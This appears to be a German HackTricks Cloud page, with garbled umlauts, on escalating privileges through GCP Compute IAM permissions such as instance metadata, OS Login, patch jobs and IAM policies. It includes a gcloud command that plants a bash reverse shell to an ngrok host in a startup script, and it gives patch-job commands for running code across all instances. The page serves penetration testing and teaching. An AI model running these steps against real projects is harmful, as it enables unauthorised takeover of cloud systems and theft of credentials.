# GCP - Berechtigungserh√∂hung f√ºr Compute

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

## Compute

F√ºr weitere Informationen zu Compute und VPC (Netzwerk) in GCP √ºberpr√ºfen Sie:

{% content-ref url="../../gcp-services/gcp-compute-instances-enum/" %}
[gcp-compute-instances-enum](../../gcp-services/gcp-compute-instances-enum/)
{% endcontent-ref %}

{% hint style="danger" %}
Beachten Sie, dass f√ºr alle Berechtigungserh√∂hungsangriffe, die erfordern, dass Sie die Metadaten der Instanz √§ndern (wie das Hinzuf√ºgen neuer Benutzer und SSH-Schl√ºssel), **`actAs`-Berechtigungen √ºber den an die Instanz angeh√§ngten SA erforderlich sind**, auch wenn der SA bereits angeh√§ngt ist!
{% endhint %}

### `compute.projects.setCommonInstanceMetadata`

Mit dieser Berechtigung k√∂nnen Sie die **Metadaten**-Informationen einer **Instanz √§ndern** und die **autorisierten Schl√ºssel eines Benutzers** √§ndern oder einen **neuen Benutzer mit sudo-Berechtigungen erstellen**. Dadurch k√∂nnen Sie √ºber SSH auf eine beliebige VM-Instanz zugreifen und das GCP-Servicekonto stehlen, mit dem die Instanz ausgef√ºhrt wird.\
Einschr√§nkungen:

* Beachten Sie, dass GCP-Servicekonten, die standardm√§√üig in VM-Instanzen ausgef√ºhrt werden, einen **sehr begrenzten Umfang** haben
* Sie m√ºssen in der Lage sein, den SSH-Server zu kontaktieren, um sich anzumelden

F√ºr weitere Informationen dar√ºber, wie Sie diese Berechtigung ausnutzen k√∂nnen, √ºberpr√ºfen Sie:

{% content-ref url="gcp-add-custom-ssh-metadata.md" %}
[gcp-add-custom-ssh-metadata.md](gcp-add-custom-ssh-metadata.md)
{% endcontent-ref %}

Sie k√∂nnten diesen Angriff auch ausf√ºhren, indem Sie ein neues Startskript hinzuf√ºgen und die Instanz neu starten:
```bash
gcloud compute instances add-metadata my-vm-instance \
--metadata startup-script='#!/bin/bash
bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/18347 0>&1 &'

gcloud compute instances reset my-vm-instance
```
### `compute.instances.setMetadata`

Diese Berechtigung gibt **die gleichen Privilegien wie die vorherige Berechtigung**, aber nur f√ºr bestimmte Instanzen anstelle des gesamten Projekts. Es gelten **die gleichen Exploits und Einschr√§nkungen wie f√ºr den vorherigen Abschnitt**.

### `compute.instances.setIamPolicy`

Diese Art von Berechtigung erm√∂glicht es Ihnen, sich selbst eine Rolle mit den vorherigen Berechtigungen zu **erteilen und Privilegien zu eskalieren, indem Sie sie missbrauchen**.

### **`compute.instances.osLogin`**

Wenn **OSLogin auf der Instanz aktiviert ist**, k√∂nnen Sie mit dieser Berechtigung einfach **`gcloud compute ssh [INSTANZ]`** ausf√ºhren und sich mit der Instanz verbinden. Sie **haben keine Root-Rechte** innerhalb der Instanz.

### **`compute.instances.osAdminLogin`**

Wenn **OSLogin auf der Instanz aktiviert ist**, k√∂nnen Sie mit dieser Berechtigung einfach **`gcloud compute ssh [INSTANZ]`** ausf√ºhren und sich mit der Instanz verbinden. Sie haben **Root-Rechte** innerhalb der Instanz.

### `compute.instances.create`,`iam.serviceAccounts.actAs, compute.disks.create`, `compute.instances.create`, `compute.instances.setMetadata`, `compute.instances.setServiceAccount`, `compute.subnetworks.use`, `compute.subnetworks.useExternalIp`

Es ist m√∂glich, **eine virtuelle Maschine mit einem zugewiesenen Service Account zu erstellen und das Token des Service Accounts zu stehlen**, indem auf die Metadaten zugegriffen wird, um Privilegien darauf zu eskalieren.

Das Exploit-Skript f√ºr diese Methode finden Sie [hier](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/compute.instances.create.py).

### `osconfig.patchDeployments.create` | `osconfig.patchJobs.exec`

Wenn Sie die Berechtigungen **`osconfig.patchDeployments.create`** oder **`osconfig.patchJobs.exec`** haben, k√∂nnen Sie einen [**Patch-Job oder ein Deployment**](https://blog.raphael.karger.is/articles/2022-08/GCP-OS-Patching) erstellen. Dadurch k√∂nnen Sie seitlich in der Umgebung bewegen und Codeausf√ºhrung auf allen Compute-Instanzen innerhalb eines Projekts erlangen.

Wenn Sie dies manuell ausnutzen m√∂chten, m√ºssen Sie entweder einen [Patch-Job](https://github.com/rek7/patchy/blob/main/pkg/engine/patches/patch\_job.json) oder ein [Deployment](https://github.com/rek7/patchy/blob/main/pkg/engine/patches/patch\_deployment.json) f√ºr einen Patch-Job erstellen:

`gcloud compute os-config patch-jobs execute --file=patch.json`

Um ein Patch-Deployment bereitzustellen:

`gcloud compute os-config patch-deployments create my-update --file=patch.json`

Automatisierte Tools wie [patchy](https://github.com/rek7/patchy) existieren, um laxen Berechtigungen zu erkennen und automatisch seitlich zu bewegen.

**Sie k√∂nnen dies auch f√ºr Persistenz missbrauchen.**

### `compute.machineImages.setIamPolicy`

**Erteilen Sie sich zus√§tzliche Berechtigungen** f√ºr Compute-Images.

### `compute.snapshots.setIamPolicy`

**Erteilen Sie sich zus√§tzliche Berechtigungen** f√ºr ein Disk-Snapshot.

### `compute.disks.setIamPolicy`

**Erteilen Sie sich zus√§tzliche Berechtigungen** f√ºr eine Festplatte.

### Umgehung von Zugriffsberechtigungen

Unter folgendem Link finden Sie einige [**Ideen, um Zugriffsberechtigungen zu umgehen**](../).

### Lokale Privilegieneskalation in GCP Compute-Instanz

{% content-ref url="../gcp-local-privilege-escalation-ssh-pivoting.md" %}
[gcp-local-privilege-escalation-ssh-pivoting.md](../gcp-local-privilege-escalation-ssh-pivoting.md)
{% endcontent-ref %}

## Referenzen

* [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>
